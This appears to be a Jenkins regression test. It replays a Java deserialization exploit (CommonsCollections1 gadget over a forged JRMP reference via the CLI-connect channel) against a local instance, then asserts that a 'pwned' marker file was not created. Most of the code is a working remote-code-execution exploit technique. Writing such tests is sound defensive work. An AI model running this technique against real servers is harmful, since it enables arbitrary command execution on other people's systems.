@Test public void commonsCollections1() throws Exception {
  r.jenkins.setAgentProtocols(Collections.singleton("CLI-connect"));
  File pwned=new File(r.jenkins.getRootDir(),"pwned");
  int jrmpPort=12345;
  URL u=r.getURL();
  HttpURLConnection hc=(HttpURLConnection)u.openConnection();
  int clip=Integer.parseInt(hc.getHeaderField("X-Jenkins-CLI-Port"));
  InetSocketAddress isa=new InetSocketAddress(u.getHost(),clip);
  Socket s=null;
  Channel c=null;
  try {
    System.err.println("* Opening socket " + isa);
    s=SocketFactory.getDefault().createSocket(isa.getAddress(),isa.getPort());
    s.setKeepAlive(true);
    s.setTcpNoDelay(true);
    System.err.println("* Opening channel");
    OutputStream outputStream=s.getOutputStream();
    DataOutputStream dos=new DataOutputStream(outputStream);
    dos.writeUTF("Protocol:CLI-connect");
    ExecutorService cp=Executors.newCachedThreadPool();
    try {
      c=new ChannelBuilder("EXPLOIT",cp).withMode(Mode.BINARY).build(s.getInputStream(),outputStream);
    }
 catch (    SocketException x) {
      Assume.assumeNoException("failed to connect to CLI",x);
    }
    System.err.println("* Channel open");
    Class<?> reqClass=Class.forName("hudson.remoting.RemoteInvocationHandler$RPCRequest");
    Constructor<?> reqCons=reqClass.getDeclaredConstructor(int.class,Method.class,Object[].class,ClassLoader.class,boolean.class);
    reqCons.setAccessible(true);
    Object getJarLoader=reqCons.newInstance(1,Class.forName("hudson.remoting.IChannel").getMethod("getProperty",Object.class),new Object[]{JarLoader.class.getName() + ".ours"},null,true);
    Object call=c.call((Callable<Object,Exception>)getJarLoader);
    InvocationHandler remote=Proxy.getInvocationHandler(call);
    Class<?> rih=Class.forName("hudson.remoting.RemoteInvocationHandler");
    Field oidF=rih.getDeclaredField("oid");
    oidF.setAccessible(true);
    int oid=oidF.getInt(remote);
    System.err.println("* JarLoader oid is " + oid);
    Constructor<UnicastRemoteObject> uroC=UnicastRemoteObject.class.getDeclaredConstructor();
    uroC.setAccessible(true);
    ReflectionFactory rf=ReflectionFactory.getReflectionFactory();
    Constructor<?> sc=rf.newConstructorForSerialization(ActivationGroupImpl.class,uroC);
    sc.setAccessible(true);
    UnicastRemoteObject uro=(UnicastRemoteObject)sc.newInstance();
    Field portF=UnicastRemoteObject.class.getDeclaredField("port");
    portF.setAccessible(true);
    portF.set(uro,jrmpPort);
    Field f=RemoteObject.class.getDeclaredField("ref");
    f.setAccessible(true);
    f.set(uro,new UnicastRef2(new LiveRef(new ObjID(2),new TCPEndpoint("localhost",12345),true)));
    Object o=reqCons.newInstance(oid,JarLoader.class.getMethod("isPresentOnRemote",Class.forName("hudson.remoting.Checksum")),new Object[]{uro},null,true);
    try {
      c.call((Callable<Object,Exception>)o);
    }
 catch (    Exception e) {
      e.printStackTrace();
      String msg=e.getMessage();
      int start=msg.indexOf("objID:[");
      if (start < 0) {
        return;
      }
      int sep=msg.indexOf(", ",start + 1);
      if (sep < 0) {
        throw new Exception("Failed to get object id, separator");
      }
      int end=msg.indexOf("]",sep + 1);
      if (end < 0) {
        throw new Exception("Failed to get object id, separator");
      }
      String uid=msg.substring(start + 7,sep);
      String objNum=msg.substring(sep + 2,end);
      System.err.println("* UID is " + uid);
      System.err.println("* ObjNum is " + objNum);
      String[] parts=uid.split(":");
      long obj=Long.parseLong(objNum);
      int o1=Integer.parseInt(parts[0],16);
      long o2=Long.parseLong(parts[1],16);
      short o3=Short.parseShort(parts[2],16);
      exploit(new InetSocketAddress(isa.getAddress(),jrmpPort),obj,o1,o2,o3,new CommonsCollections1(),"touch " + pwned);
    }
    c.close();
  }
  finally {
    if (s != null) {
      s.close();
    }
  }
  Thread.sleep(5000);
  assertFalse("Pwned!",pwned.exists());
}
